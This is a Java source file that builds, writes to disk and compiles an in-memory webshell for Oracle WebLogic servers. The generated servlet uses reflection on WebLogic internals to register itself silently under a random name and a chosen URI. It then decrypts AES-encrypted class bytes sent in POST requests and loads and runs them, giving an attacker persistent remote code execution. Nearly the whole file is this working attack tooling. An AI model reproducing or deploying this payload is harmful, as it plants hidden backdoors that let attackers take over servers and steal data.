package org.example;
import javax.tools.JavaCompiler;
import javax.tools.JavaFileObject;
import javax.tools.ToolProvider;
import javax.tools.*;
import java.io.File;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Arrays;
import java.util.Random;

public class getPayload {

    private static final String CHARACTERS = "abcdefghijklmnopqrstuvwxyz0123456789";
    private static final int LENGTH = 6;
    public static String servletName = generateRandomString() + "Servlet";
//    public static String servletName = "cmdServlet";
    public static String generateRandomString() {
        Random random = new Random();
        StringBuilder sb = new StringBuilder(LENGTH);

        for (int i = 0; i < LENGTH; i++) {
            int randomIndex = random.nextInt(CHARACTERS.length());
            sb.append(CHARACTERS.charAt(randomIndex));
        }

        return sb.toString();
    }

    public String GetNewKey(String password) throws NoSuchAlgorithmException {
        MessageDigest digest = MessageDigest.getInstance("MD5");
        digest.update(password.getBytes());
        byte[] messageDigest = digest.digest();
        BigInteger no = new BigInteger(1, messageDigest);
        StringBuilder md5Str = new StringBuilder(no.toString(16));
        while (md5Str.length() < 32) {
            md5Str.insert(0, "0");
        }
        return md5Str.substring(0, 16);
    }

    public String ChangePayload(String newUri, String password, String className) throws NoSuchAlgorithmException {
        return  "import java.io.IOException;\n" +
                "import java.lang.reflect.Constructor;\n" +
                "import java.lang.reflect.Field;\n" +
                "import java.lang.reflect.Method;\n" +
                "import java.security.SecureClassLoader;\n" +
                "import java.util.ArrayList;\n" +
                "import java.util.HashMap;\n" +
                "import java.util.HashSet;\n" +
                "import java.util.List;\n" +
                "import java.util.Map;\n" +
                "import java.util.Iterator;\n" +
                "import java.util.Base64;\n" +
//                "import sun.misc.BASE64Decoder;\n" +
                "import javax.crypto.Cipher;\n" +
                "import javax.crypto.spec.SecretKeySpec;\n" +
                "import javax.servlet.ServletException;\n" +
                "import javax.servlet.http.HttpServlet;\n" +
                "import javax.servlet.http.HttpServletRequest;\n" +
                "import javax.servlet.http.HttpServletResponse;\n" +
                "import javax.servlet.http.HttpSession;\n" +
                "import weblogic.management.runtime.ApplicationRuntimeMBean;\n" +
                "import weblogic.servlet.internal.ServletStubImpl;\n" +
                "import weblogic.servlet.internal.WebAppServletContext;\n" +
                "import weblogic.servlet.utils.ServletMapping;\n" +
                "import weblogic.t3.srvr.ServerRuntime;\n" +
                "@SuppressWarnings({\"deprecation\", \"unchecked\"})\n" +
                "public class " + className + " extends HttpServlet {\n" +
                "    private static String URI = \"/" + newUri + "\";\n" +
                "    public static void main(String[] args) {\n" +
                "        try {\n" +
                "            WebAppServletContext webAppServletContext = null;\n" +
                "            Method m = Class.forName(\"weblogic.t3.srvr.ServerRuntime\").getDeclaredMethod(\"theOne\");\n" +
                "            m.setAccessible(true);\n" +
                "            ServerRuntime serverRuntime = (ServerRuntime)m.invoke((Object)null);\n" +
                "            List<WebAppServletContext> list = new ArrayList();\n" +
                "            ApplicationRuntimeMBean[] arr$ = serverRuntime.getApplicationRuntimes();\n" +
                "            int len$ = arr$.length;\n" +
                "            for(int i$ = 0; i$ < len$; ++i$) {\n" +
                "                ApplicationRuntimeMBean applicationRuntime = arr$[i$];\n" +
                "                if (applicationRuntime.getApplicationName().equals(\"bea_wls_internal\")) {\n" +
                "                    Field childrenF = applicationRuntime.getClass().getSuperclass().getDeclaredField(\"children\");\n" +
                "                    childrenF.setAccessible(true);\n" +
                "                    HashSet set = (HashSet)childrenF.get(applicationRuntime);\n" +
                "                    Iterator var11 = set.iterator();\n" +
                "                    while(var11.hasNext()) {\n" +
                "                        Object key = var11.next();\n"+
                "                        if (key.getClass().getName().equals(\"weblogic.servlet.internal.WebAppRuntimeMBeanImpl\")) {\n" +
                "                            Field contextF = key.getClass().getDeclaredField(\"context\");\n" +
                "                            contextF.setAccessible(true);\n" +
                "                            webAppServletContext = (WebAppServletContext) contextF.get(key);\n" +
                "                            list.add(webAppServletContext);\n" +
                "                        }\n" +
                "                    }\n" +
                "                }\n" +
                "            }\n" +
                "            if (webAppServletContext == null) {\n" +
                "                throw new Exception(\"null\");\n" +
                "            }\n" +
                "            Method getServletMapping = webAppServletContext.getClass().getDeclaredMethod(\"getServletMapping\");\n" +
                "            getServletMapping.setAccessible(true);\n" +
                "            ServletMapping mappings = (ServletMapping)getServletMapping.invoke(webAppServletContext);\n" +
                "            ServletStubImpl servletStub;\n" +
                "            Field classLoader = webAppServletContext.getClass().getDeclaredField(\"classLoader\");\n" +
                "            classLoader.setAccessible(true);\n" +
                "            ClassLoader classLoader1 = (ClassLoader)classLoader.get(webAppServletContext);\n" +
                "            Field cachedClasses = classLoader1.getClass().getDeclaredField(\"cachedClasses\");\n" +
                "            cachedClasses.setAccessible(true);\n" +
                "            Object cachedClasses_map = cachedClasses.get(classLoader1);\n" +
                "            Method get = cachedClasses_map.getClass().getDeclaredMethod(\"get\", Object.class);\n" +
                "            get.setAccessible(true);\n" +
                "            Method put = cachedClasses_map.getClass().getMethod(\"put\", Object.class, Object.class);\n" +
                "            put.setAccessible(true);\n" +
                "            put.invoke(cachedClasses_map, \"" + servletName + "\", " + className + ".class);\n" +
                "            Constructor URLMatchHelperConstructor;\n" +
                "            try {\n" +
                "                URLMatchHelperConstructor = Class.forName(\"weblogic.servlet.internal.ServletStubImpl\").getDeclaredConstructor(String.class, String.class, WebAppServletContext.class);\n" +
                "                URLMatchHelperConstructor.setAccessible(true);\n" +
                "                servletStub = (ServletStubImpl)URLMatchHelperConstructor.newInstance(URI, \"" + servletName + "\", webAppServletContext);\n" +
                "            } catch (Exception var16) {\n" +
                "                Constructor<?> ServletStubImplConstructor = Class.forName(\"weblogic.servlet.internal.ServletStubImpl\").getDeclaredConstructor(String.class, String.class, WebAppServletContext.class, Map.class);\n" +
                "                ServletStubImplConstructor.setAccessible(true);\n" +
                "                servletStub = (ServletStubImpl)ServletStubImplConstructor.newInstance(URI, \"" + servletName + "\", webAppServletContext, null);\n" +
                "            }\n" +
                "            URLMatchHelperConstructor = Class.forName(\"weblogic.servlet.internal.URLMatchHelper\").getDeclaredConstructor(String.class, ServletStubImpl.class);\n" +
                "            URLMatchHelperConstructor.setAccessible(true);\n" +
                "            Object umh = URLMatchHelperConstructor.newInstance(URI, servletStub);\n" +
                "            if (mappings.get(URI) == null) {\n" +
                "                mappings.put(URI, umh);\n" +
                "            }\n" +
                "        } catch (Exception var17) {}\n" +
                "    }\n" +
                "    public " + className + "(String aaaa) {}\n" +
                "    public " + className + "() {}\n" +
                "    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n" +
                "        HttpSession session = req.getSession();\n" +
                "        if (req.getMethod().equals(\"POST\")) {\n" +
                "            try {\n" +
                "                Map<String, Object> obj = new HashMap();\n" +
                "                obj.put(\"session\", session);\n" +
                "                obj.put(\"response\", resp);\n" +
                "                obj.put(\"request\", req);\n" +
                "                String k = \"" + GetNewKey(password) + "\";\n" +
                "                session.putValue(\"u\", k);\n" +
                "                Cipher c = Cipher.getInstance(\"AES\");\n" +
                "                c.init(2, new SecretKeySpec(k.getBytes(), \"AES\"));\n" +
                "                byte[] code = c.doFinal(Base64.getDecoder().decode(req.getReader().readLine()));\n" +
//                "                byte[] code = c.doFinal((new BASE64Decoder()).decodeBuffer(req.getReader().readLine()));\n" +
                "                Method dm = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, Integer.TYPE, Integer.TYPE);\n" +
                "                dm.setAccessible(true);\n" +
                "                Constructor constructor = SecureClassLoader.class.getDeclaredConstructor();\n" +
                "                constructor.setAccessible(true);\n" +
                "                ClassLoader classLoader = (ClassLoader)constructor.newInstance();\n" +
                "                Class clazz = (Class)dm.invoke(classLoader, code, 0, code.length);\n" +
                "                clazz.newInstance().equals(obj);\n" +
                "            } catch (Exception ignored) {}\n" +
                "        }\n" +
                "    }\n" +
                "    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n" +
                "        this.doGet(req, resp);\n" +
                "    }\n" +
                "}\n";
    }

    public void WritePayloadToFile(String className, String modifiedPayload){
        String fileName = className + ".java";
        try {
            FileWriter writer = new FileWriter(fileName);
            writer.write(modifiedPayload);
            writer.close();
            System.out.println("[+] Payload已成功写入文件: " + fileName);
        } catch (IOException e) {
            System.out.println("[-] 写入文件时出现错误: " + e.getMessage());
        }
    }

    public static void CompilePayloadFile(String className) {
        String javaFilePath = className + ".java";
        JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
        StandardJavaFileManager fileManager = compiler.getStandardFileManager(null, null, null);
        File[] files = new File[]{new File(javaFilePath)};
        Iterable<? extends JavaFileObject> compilationUnits = fileManager.getJavaFileObjectsFromFiles(Arrays.asList(files));
        JavaCompiler.CompilationTask task = compiler.getTask(null, fileManager, null, Arrays.asList("-Xlint:-options", "-g"), null, compilationUnits);
        boolean compilationResult = task.call();
        if (compilationResult) {
            System.out.println("[+] " + javaFilePath + " 动态编译成功！");
        } else {
            System.out.println("[-] " + javaFilePath + " 动态编译失败");
        }
        try {
            fileManager.close();
        } catch (Exception ignored) {}
    }

    public void GetPayload(String newUri, String password, String className) throws NoSuchAlgorithmException {
        WritePayloadToFile(className, ChangePayload(newUri, password, className));
        CompilePayloadFile(className);
    }
}
